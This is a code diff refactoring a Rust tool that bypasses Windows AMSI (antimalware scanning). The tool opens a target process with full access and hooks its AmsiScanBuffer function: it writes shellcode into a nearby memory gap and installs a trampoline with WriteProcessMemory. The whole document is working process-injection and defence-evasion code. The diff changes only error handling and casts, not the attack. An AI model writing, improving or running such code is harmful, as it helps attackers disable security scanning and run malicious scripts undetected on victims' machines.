@@ -1,3 +1,5 @@
+#![allow(static_mut_refs)]
+
 use std::ffi::c_void;
 use sysinfo::System;
 use windows::{
@@ -35,37 +37,39 @@ const SHELLCODE: [u8; 106] = [
     0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
 ];
 
-fn main() {
-    let args: Vec<String> = std::env::args().collect();
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let args = std::env::args().collect::<Vec<String>>();
     let process_name = &args[1];
-    let pid = find_process(process_name).expect("[!] Failed to find the PID of the target process");
+    let pid = find_process(process_name)?;
 
-    let h_module = unsafe { LoadLibraryA(s!("amsi.dll")).expect("[!] LoadLibrary Failed With Status") };
-    let address = unsafe { GetProcAddress(h_module, s!("AmsiScanBuffer")) };
-    let func_address = unsafe { std::mem::transmute::<_, *mut c_void>(address) };
-    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid).expect("[!] OpenProcess Failed With Status") };
-    
-    println!("[+] Function: AmsiScanBuffer | Address: {:?}", func_address);
-
-    println!("[+] Patching the trampoline");
     unsafe {
+        let h_module = LoadLibraryA(s!("amsi.dll"))?;
+        let address = GetProcAddress(h_module, s!("AmsiScanBuffer"));
+        let func_address = std::mem::transmute(address);
+        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
+        
+        println!("[+] Function: AmsiScanBuffer | Address: {:?}", func_address);
+    
+        println!("[+] Patching the trampoline");
         let original_bytes = *(func_address as *const u64);
         PATCH_SHELLCODE[18..26].copy_from_slice(&original_bytes.to_ne_bytes());
-    };
-
-    println!("[+] Looking for a memory hole");
-    let address_role = find_memory_role(func_address as usize, h_process).expect("[!] find_memory_role Failed With Status");
     
-    println!("[+] Writing the shellcode");
-    write_shellcode(h_process, address_role);
+        println!("[+] Looking for a memory hole");
+        let address_role = find_memory_role(func_address as usize, h_process)?;
+        
+        println!("[+] Writing the shellcode");
+        write_shellcode(h_process, address_role);
+    
+        println!("[+] Installing the trampoline");
+        install_trampoline(h_process, address_role, func_address);
+    
+        println!("[+] Finish :)");
+    }
 
-    println!("[+] Installing the trampoline");
-    install_trampoline(h_process, address_role, func_address);
-
-    println!("[+] Finish :)")
+    Ok(())
 }
 
-fn find_memory_role(func_address: usize, h_process: HANDLE) -> Result<*mut c_void, String> {
+fn find_memory_role(func_address: usize, h_process: HANDLE) -> Result<*mut c_void, &'static str> {
     let mut address = (func_address & 0xFFFFFFFFFFF70000) - 0x70000000;
     while address < func_address + 0x70000000 {
         let tmp_address = unsafe {
@@ -86,7 +90,7 @@ fn find_memory_role(func_address: usize, h_process: HANDLE) -> Result<*mut c_voi
         address += 0x10000;
     }
 
-    Err("[!] Memory Role Not Found".to_string())
+    Err("Memory Role Not Found")
 }
 
 fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address: *mut c_void) {
@@ -110,7 +114,7 @@ fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address:
         WriteProcessMemory(
             h_process,
             function_address,
-            trampoline.as_ptr() as _,
+            trampoline.as_ptr().cast(),
             trampoline.len(),
             Some(&mut number_bytes_written),
         ).expect("[!] WriteProcessMemory Failed With Status");
@@ -131,7 +135,7 @@ fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
         WriteProcessMemory(
             h_process, 
             address, 
-            PATCH_SHELLCODE.as_ptr() as _, 
+            PATCH_SHELLCODE.as_ptr().cast(), 
             PATCH_SHELLCODE.len(), 
             Some(&mut number_of_write)
         ).expect("[!] WriteProcessMemory Failed With Status");
@@ -140,7 +144,7 @@ fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
         WriteProcessMemory( 
             h_process, 
             shellcode_address as *mut c_void, 
-            SHELLCODE.as_ptr() as _, 
+            SHELLCODE.as_ptr().cast(), 
             SHELLCODE.len(), 
             Some(&mut number_of_write)
         ).expect("[!] WriteProcessMemory (2) Failed With Status");
@@ -156,7 +160,7 @@ fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
     }   
 }
 
-fn find_process(process_name: &str) -> Result<u32, ()> {
+fn find_process(process_name: &str) -> Result<u32, &'static str> {
     let mut system = System::new_all();
     system.refresh_all();
 
@@ -166,5 +170,5 @@ fn find_process(process_name: &str) -> Result<u32, ()> {
         }
     }
 
-    Err(())
+    Err("Process not found")
 }
